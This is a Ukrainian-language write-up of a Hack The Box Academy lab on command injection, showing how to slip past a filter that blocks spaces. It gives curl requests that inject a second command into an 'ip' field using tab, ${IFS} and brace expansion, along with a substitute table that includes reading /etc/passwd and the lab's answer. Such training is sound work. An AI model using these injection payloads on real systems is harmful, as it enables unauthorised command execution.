## Command Injections — Blacklisted Characters: Space Bypass

**Модуль:** [Command Injections](https://academy.hackthebox.com/app/module/109)
**Секція:** [Bypassing Space Filters](https://academy.hackthebox.com/app/module/109/section/1036)
**Відповідь:** `1613`

***

## Концепція

Сервер блокує **пробіл** (`%20`) у blacklist — без нього неможливо передати аргументи до команди. Але є кілька символів що shell інтерпретує як роздільник замість пробілу:

| Замінник | Код | Як shell бачить |
|---|---|---|
| Tab | `%09` | Роздільник аргументів |
| `${IFS}` | (змінна shell) | Internal Field Separator = пробіл/tab/newline |
| `{cmd,arg}` | Brace expansion | `{ls,-la}` → `ls -la` |

***

## Чому `%20` заблокований, а інші ні

```bash
# Типовий blacklist на сервері:
if (preg_match('/[;&| ]/', $input))  # блокує пробіл явно
# АБО
if (strpos($input, ' ') !== false)   # лише пробіл

# %09 (tab), ${IFS}, {ls,-la} — НЕ є пробілом → проходять фільтр
```

***

## Три робочі методи

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://154.57.164.74:32673"

# Метод 1: Tab замість пробілу (%09)
curl -s -X POST "$TARGET/index.php" \
  --data "ip=127.0.0.1%0als%09-la" | grep "index.php"
# -rw-r--r--. 1 www-data www-data 1613 Jul 16 2021 index.php ✅

# Метод 2: Brace expansion {cmd,arg} — shell розгортає в "ls -la"
curl -s -X POST "$TARGET/index.php" \
  --data "ip=127.0.0.1%0a{ls,-la}" | grep "index.php"
# -rw-r--r--. 1 www-data www-data 1613 Jul 16 2021 index.php ✅

# Метод 3: ${IFS} — змінна shell що містить пробіл (не спрацювало в цьому випадку)
curl -s -X POST "$TARGET/index.php" \
  --data "ip=127.0.0.1%0als${IFS}-la" | grep "index.php"
# (пусто — ${IFS} розгорнулося локально в bash перед відправкою)
```

> **Важливо про `${IFS}`:** При використанні у `--data` всередині подвійних лапок bash **розгортає змінну локально** перед відправкою → на сервер йде пробіл → блокується. Треба екранувати: `--data 'ip=127.0.0.1%0als${IFS}-la'` (одинарні лапки).

***

## Чому `%20` не працює

```bash
# Заблокований напряму
curl -s -X POST "$TARGET/index.php" \
  --data "ip=127.0.0.1%0als%20-la" | grep -E "Invalid|index"
# Invalid input ❌
```

***

## Повна таблиця замінників пробілу

| Метод | Приклад | Linux | Windows |
|---|---|---|---|
| Tab `%09` | `ls%09-la` | ✅ | ✅ |
| `${IFS}` | `ls${IFS}-la` | ✅ | ❌ |
| Brace expansion | `{ls,-la}` | ✅ | ❌ |
| `$IFS$9` | `ls$IFS$9-la` | ✅ | ❌ |
| `{cat,/etc/passwd}` | читання файлу | ✅ | ❌ |

***

## Відповідь

```
1613
```
